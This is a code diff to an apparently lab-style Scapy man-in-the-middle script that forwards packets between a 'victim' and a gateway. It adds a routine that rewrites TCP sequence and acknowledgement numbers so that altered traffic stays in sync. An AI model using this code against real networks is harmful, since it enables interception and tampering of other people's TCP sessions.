@@ -25,7 +25,8 @@ def send_pkt (packet):
 
 # Forward captured packet
 def forward(packet):
-	check_payload(packet);
+	roleplay(packet)
+	# check_payload(packet);
 	myMAC = packet[Ether].dst
 	packet[Ether].dst = EX.get(packet[Ether].src)
 	packet[Ether].src = myMAC
@@ -38,6 +39,85 @@ def set_payload(packet):
 #enddef
 
 # test
+client = {
+	"seq": None,
+	"ack": None,
+	"plen": None, # payload_len
+	"expected_ack": None # expected ack number
+}
+server = {
+	"seq": None,
+	"ack": None,
+	"plen": None, # payload_len
+	"expected_ack": None # expected ack number
+}
+
+def roleplay(packet):
+	# Make sure TCP sequence and ack numbers are correct
+	if packet.haslayer(TCP):
+		if EX.get(packet[Ether].src) == gateMAC:
+			# packet from client
+			# initialization
+			if client["seq"] == None and packet[TCP].seq != 0:
+				client["seq"] = packet[TCP].seq
+				client["expected_ack"] = client["seq"] + 1
+				return
+			#endif
+			client["seq"] = packet[TCP].seq
+			client["ack"] = packet[TCP].ack
+			client["plen"] = 0
+			if packet.haslayer(Raw):
+				client["plen"] = len(packet[Raw].load)
+			#endif
+			# expected ack
+			client["expected_ack"] = client["seq"] + client["plen"]
+			if server["expected_ack"] != None and server["expected_ack"] != client["ack"]:
+				packet[TCP].ack = server["expected_ack"]
+				print "client: assigned ack " + str(server["expected_ack"])
+			#endif
+			# expected seq from client to server
+			if server["ack"] != None and client["seq"] != server["ack"]:
+				packet[TCP].seq = server["ack"]
+				print "client: assigned seq " + str(server["ack"])
+			#endif
+			print "From client:"
+			print "SEQ: " + str(client["seq"])
+			print "ACK: " + str(client["ack"])
+			print "LEN: " + str(client["plen"])
+			print " "
+		elif EX.get(packet[Ether].src) == victimMAC:
+			# packet from server
+			# initialization
+			if server["seq"] == None and packet[TCP].seq != 0:
+				server["seq"] = packet[TCP].seq
+				server["expected_ack"] = server["seq"] + 1
+				return
+			#endif
+			server["seq"] = packet[TCP].seq
+			server["ack"] = packet[TCP].ack
+			server["plen"] = 0
+			if packet.haslayer(Raw):
+				server["plen"] = len(packet[Raw].load)
+			#endif
+			server["expected_ack"] = server["seq"] + server["plen"]
+			if client["expected_ack"] != None and client["expected_ack"] != server["ack"]:
+				packet[TCP].ack = client["expected_ack"]
+				print "server: assigned ack " + str(client["expected_ack"])
+			#endif
+			# expected seq from server to client
+			if client["ack"] != None and server["seq"] != client["ack"]:
+				packet[TCP].seq = client["ack"]
+				print "server: assigned seq " + str(client["ack"])
+			#endif
+			print "From server:"
+			print "SEQ: " + str(server["seq"])
+			print "ACK: " + str(server["ack"])
+			print "LEN: " + str(server["plen"])
+			print " "
+		#endif
+	#endif
+#enddef
+
 def check_payload(packet):
 	if not packet.haslayer(TCP) or not packet.haslayer(Raw):
 		return
